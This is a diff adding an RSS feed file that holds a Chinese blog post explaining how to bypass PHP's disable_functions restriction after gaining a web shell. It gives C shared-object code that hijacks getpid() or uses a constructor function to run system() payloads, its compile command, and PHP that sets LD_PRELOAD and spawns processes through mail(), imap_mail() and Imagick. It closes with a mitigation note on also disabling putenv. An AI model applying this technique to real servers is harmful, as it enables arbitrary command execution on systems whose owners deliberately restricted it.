@@ -1,0 +1,256 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Disbale_functions on 诗与胡说</title>
+    <link>https://kylingit.com/tags/disbale_functions/index.xml</link>
+    <description>Recent content in Disbale_functions on 诗与胡说</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh_cn</language>
+    <copyright>Copyright © 2019 kylinking</copyright>
+    <atom:link href="https://kylingit.com/tags/disbale_functions/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>利用LD_PRELOAD绕过disbale_functions</title>
+      <link>https://kylingit.com/blog/%E5%88%A9%E7%94%A8ld_preload%E7%BB%95%E8%BF%87disbale_functions/</link>
+      <pubDate>Tue, 02 Apr 2019 10:21:42 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/%E5%88%A9%E7%94%A8ld_preload%E7%BB%95%E8%BF%87disbale_functions/</guid>
+      <description>
+
+&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
+
+&lt;h3 id=&#34;0x01-背景&#34;&gt;0x01 背景&lt;/h3&gt;
+
+&lt;p&gt;有时候拿到&lt;code&gt;shell&lt;/code&gt;后发现无法执行系统命令，通过&lt;code&gt;phpinfo&lt;/code&gt;查看发现设置了&lt;code&gt;disbale_functions&lt;/code&gt;，禁止了大部分可以执行命令的方法，这时候就要考虑绕过这个限制。本文是介绍了利用&lt;code&gt;LD_PRELOAD&lt;/code&gt;环境变量加载恶意共享库的方式绕过，当然方式不止文中列出的几种，有何遗漏或不足欢迎提建议。&lt;/p&gt;
+
+&lt;h3 id=&#34;0x02-ld-preload-环境变量&#34;&gt;0x02 LD_PRELOAD 环境变量&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;em&gt;LD_PRELOAD&lt;/em&gt; is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (&lt;em&gt;libc.so&lt;/em&gt;) This is called preloading a library.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;根据文档介绍，如果使用&lt;code&gt;LD_PRELOAD&lt;/code&gt;环境变量指定了一个共享库或共享对象，那么这个共享对象会在其他对象加载前被加载，例如&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ LD_PRELOAD=/path/to/my/malloc.so /bin/ls
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;即在执行&lt;code&gt;ls&lt;/code&gt;命令前，会先加载指定路径的&lt;code&gt;malloc.so&lt;/code&gt;文件，如果这是一个恶意共享对象，那么可以执行任意操作。&lt;/p&gt;
+
+&lt;p&gt;我们可以通过&lt;code&gt;readelf&lt;/code&gt;命令查看某个命令调用了哪些外部链接库，然后找到其中某个库，编写同名函数进行劫持，然后编译成共享对象文件，接着使用&lt;code&gt;LD_PRELOAD&lt;/code&gt;环境变量指定生成的对象，达到命令执行的目的。&lt;/p&gt;
+
+&lt;p&gt;一般情况我们选择简单的或者不带参数的命令，例如&lt;code&gt;id&lt;/code&gt;，&lt;code&gt;ls&lt;/code&gt;，&lt;code&gt;whoami&lt;/code&gt;等，另外为了实现原型一致的劫持函数，也尽量选择常用的或者不用传递参数的函数，例如&lt;code&gt;getuid()&lt;/code&gt;，&lt;code&gt;getpid()&lt;/code&gt;，&lt;code&gt;getgid()&lt;/code&gt;等&lt;/p&gt;
+
+&lt;p&gt;以&lt;code&gt;python&lt;/code&gt;为例，通过命令&lt;code&gt;readelf -s /usr/bin/python&lt;/code&gt;列出&lt;code&gt;python&lt;/code&gt;程序调用的系统函数，可以筛选出&lt;code&gt;get&lt;/code&gt;型的函数&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190402111421.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;尝试劫持&lt;code&gt;getpid()&lt;/code&gt;函数&lt;/p&gt;
+
+&lt;p&gt;首先通过man命令查看&lt;code&gt;getpid()&lt;/code&gt;函数的实现&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190402111816.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后重写&lt;code&gt;getpid()&lt;/code&gt;函数&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+
+pid_t getpid(void){
+    system(&amp;quot;echo &#39;pwned by getpid!&#39;&amp;quot;);
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;因为通过设置&lt;code&gt;preload&lt;/code&gt;劫持了比较底层的函数，而派发出的新进程如果用到该函数也会一并被劫持，也就是说如果没有及时&lt;code&gt;unsetenv(&amp;quot;LD_PRELOAD&amp;quot;)&lt;/code&gt;则会导致不断循环，一旦操作敏感就会比较危险，所以一定要及时删除这个环境变量，改进版如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+
+void payload(void){
+    system(&amp;quot;echo &#39;pwned by getpid!&#39;&amp;quot;);
+}
+
+pid_t getpid(void){
+    if (getenv(&amp;quot;LD_PRELOAD&amp;quot;) == NULL){
+        return 0;
+    }
+
+    unsetenv(&amp;quot;LD_PRELOAD&amp;quot;);
+    payload();
+
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;接着编译共享对象，&lt;code&gt;-shared&lt;/code&gt;表示生成共享库，&lt;code&gt;-fPIC&lt;/code&gt;表示使用地址无关代码&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;gcc -shared -fPIC getpid.c -o getpid.so
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;LD_PRELOAD&lt;/code&gt;设置加载so文件，运行python，可以看到函数被成功劫持&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403104653.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这个方法有一定限制，首先需要找到一个相对简单的函数原型，然后需要确保该函数被目标程序调用，因此一个更好的方法是利用扩展修饰符修饰函数，优先加载恶意函数，增强通用性，这里就用到了&lt;code&gt;扩展修饰符&lt;/code&gt; &lt;code&gt;__attribute__((constructor))&lt;/code&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;GCC 有个 C 语言扩展修饰符 &lt;code&gt;__attribute__((constructor))&lt;/code&gt;，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 &lt;code&gt;__attribute__((constructor))&lt;/code&gt; 修饰的函数&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;简单说就是&lt;code&gt;__attribute__&lt;/code&gt;可以修饰几个属性，包括函数属性、变量属性和类型属性，语法格式为：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;__attribute__(( attribute-list ))&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;当函数属性被设置为&lt;code&gt;constructor&lt;/code&gt;时，该函数会在可执行文件（或共享对象）加载时被调用，同理当设置属性为&lt;code&gt;destructor&lt;/code&gt;时会在对象&lt;code&gt;unload&lt;/code&gt;时调用，也就是说设置为这两个属性时，会在&lt;code&gt;main()&lt;/code&gt;函数执行之前或者&lt;code&gt;return()&lt;/code&gt;执行之后被调用，我们就可以借助这个扩展修饰符，当加载so文件时自动执行恶意函数，这样就不局限于某个特定函数，使用面大大扩展了&lt;/p&gt;
+
+&lt;p&gt;重新写一个函数，使用 &lt;code&gt;__attribute__((constructor))&lt;/code&gt;修饰&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;unistd.h&amp;gt;
+
+void payload(void){
+    system(&amp;quot;echo &#39;pwned!&#39;&amp;quot;);
+}
+
+__attribute__ ((__constructor__)) void exec(void){
+    if (getenv(&amp;quot;LD_PRELOAD&amp;quot;) == NULL){
+        return;
+    }
+
+    unsetenv(&amp;quot;LD_PRELOAD&amp;quot;);
+    payload();
+
+    return;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;重新编译并加载，成功执行&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190402154051.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;0x03-绕过-disable-functions&#34;&gt;0x03 绕过&lt;code&gt;disable_functions&lt;/code&gt;&lt;/h3&gt;
+
+&lt;p&gt;接下来看一下怎么利用&lt;code&gt;LD_PRELOAD&lt;/code&gt;在&lt;code&gt;php&lt;/code&gt;启用&lt;code&gt;disable_functions&lt;/code&gt;禁用了命令/代码执行函数的情况下绕过这个限制，达到命令执行的效果&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;php.ini&lt;/code&gt;限制大部分执行命令的函数&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;disable_functions = assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;根据上面的介绍，我们突破&lt;code&gt;disable_functions&lt;/code&gt;的步骤如下&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;编写恶意C函数，并编译成共享对象；&lt;/li&gt;
+&lt;li&gt;在&lt;code&gt;php&lt;/code&gt;执行过程中找到一个函数，这个函数能够产生一个新的进程；&lt;/li&gt;
+&lt;li&gt;通过&lt;code&gt;putenv&lt;/code&gt;设置&lt;code&gt;LD_PRELOAD&lt;/code&gt;环境变量，使得新产生的进程优先加载恶意共享对象；&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;第1步在上文已经解决了，第3步也比较容易实现，关键就是第2步，找到一个&lt;code&gt;php&lt;/code&gt;中可以新起一个进程的函数，目的是为了让这个新进程使用的环境变量加载我们设置的恶意共享对象，达到劫持的目的&lt;/p&gt;
+
+&lt;p&gt;在&lt;code&gt;php&lt;/code&gt;中有这么几个函数可以被利用，&lt;code&gt;mail()&lt;/code&gt;，&lt;code&gt;imap_mail()&lt;/code&gt;，以及&lt;code&gt;Imagick&lt;/code&gt;，来逐一测试&lt;/p&gt;
+
+&lt;h4 id=&#34;mail&#34;&gt;mail()&lt;/h4&gt;
+
+&lt;p&gt;&lt;code&gt;mail()&lt;/code&gt;函数会启动&lt;code&gt;sendmail&lt;/code&gt;进程发送邮件，这个过程是可以被劫持的&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    mail(&amp;quot;admin@localhost&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;通过&lt;code&gt;strace&lt;/code&gt;查看&lt;code&gt;mail()&lt;/code&gt;函数调用的过程&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190402180420.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到除了&lt;code&gt;php&lt;/code&gt;自身进程外还启动了&lt;code&gt;sendmail&lt;/code&gt;进程，而&lt;code&gt;sendmail&lt;/code&gt;在执行过程中调用了多个可以被劫持的函数，例如&lt;code&gt;getuid&lt;/code&gt;，&lt;code&gt;getgid&lt;/code&gt;， &lt;code&gt;getpid&lt;/code&gt;等，我们还是以上面的&lt;code&gt;getpid&lt;/code&gt;为例测试&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403103643.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;通过&lt;code&gt;putenv&lt;/code&gt;将&lt;code&gt;LD_PRELOAD&lt;/code&gt;环境变量设置为上面编译好的&lt;code&gt;getpid.so&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    putenv(&amp;quot;LD_PRELOAD=/tmp/getpid.so&amp;quot;);
+    mail(&amp;quot;admin@localhost&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403104908.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;成功绕过&lt;code&gt;disable_functions&lt;/code&gt;限制。另外也可以用&lt;code&gt;__attribute__ ((__constructor__))&lt;/code&gt;修饰函数，这样就不局限于某个系统函数。&lt;/p&gt;
+
+&lt;h4 id=&#34;imap-mail&#34;&gt;imap_mail()&lt;/h4&gt;
+
+&lt;p&gt;&lt;code&gt;imap_mail()&lt;/code&gt;函数与&lt;code&gt;mail()&lt;/code&gt;函数类似，都会调用&lt;code&gt;sendmail&lt;/code&gt;程序发送邮件，因此也能通过&lt;code&gt;LD_PRELOAD&lt;/code&gt;环境变量绕过，方法同上&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403141357.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;imagick&#34;&gt;Imagick&lt;/h4&gt;
+
+&lt;p&gt;&lt;code&gt;Imagick&lt;/code&gt;作为使用广泛的图形处理库，它在处理各种类型的文件时会调用不同的处理程序，这个过程也是可以进行劫持的，常见的文件类型与处理程序对应关系列举如下&lt;/p&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;文件类型&lt;/th&gt;
+&lt;th&gt;调用程序&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;EPI/EPS/PDF/PS&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;http://www.cs.wisc.edu/~ghost&#34;&gt;Ghostscript&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;MNG/M2V&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;http://www.ffmpeg.org/download.html&#34;&gt;ffmpeg&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;JXR&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://jxrlib.codeplex.com/&#34;&gt;jxrlib&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;详细的依赖调用关系可以参考&lt;a href=&#34;https://imagemagick.org/script/formats.php&#34;&gt;官方网站&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;以&lt;code&gt;eps&lt;/code&gt;文件为例，使用&lt;code&gt;Imagick&lt;/code&gt;加载&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $a = new Imagick(&amp;quot;/tmp/payload.eps&amp;quot;);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;如果出现报错&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;Uncaught ImagickException: not authorized &#39;payload.eps&#39;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;需要修改&lt;code&gt;imagick&lt;/code&gt;的&lt;code&gt;policy.xml&lt;/code&gt;文件，把相应文件类型的权限修改为&lt;code&gt;read|write&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403151458.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;通过&lt;code&gt;strace&lt;/code&gt;可以看到启动了&lt;code&gt;gs&lt;/code&gt;程序处理&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403152424.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;因此我们同样可以通过修改&lt;code&gt;LD_PRELOAD&lt;/code&gt;达到执行代码的目的，而实际上这个过程并不要求&lt;code&gt;payload.eps&lt;/code&gt;是个合法的&lt;code&gt;eps&lt;/code&gt;文件&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403153255.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;类似的，&lt;code&gt;pdf&lt;/code&gt;、&lt;code&gt;ps&lt;/code&gt;、&lt;code&gt;wmv&lt;/code&gt;文件等，都可以通过这个方法利用。&lt;/p&gt;
+
+&lt;h3 id=&#34;0x04-总结&#34;&gt;0x04 总结&lt;/h3&gt;
+
+&lt;p&gt;本文主要介绍了如何利用&lt;code&gt;LD_PRELOAD&lt;/code&gt;突破&lt;code&gt;disbale_functions&lt;/code&gt;，当然这个方法也有一个限制，那就是&lt;code&gt;putenv&lt;/code&gt;没有被禁用，得以设置环境变量，因此在不影响系统运行的前提下也需要把&lt;code&gt;putenv&lt;/code&gt;加上。&lt;/p&gt;
+
+&lt;p&gt;参考：&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://www.one-tab.com/page/sF_C-HRZTTGu-K_bDaSLoQ&#34;&gt;https://www.one-tab.com/page/sF_C-HRZTTGu-K_bDaSLoQ&lt;/a&gt;&lt;/p&gt;
+
+&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
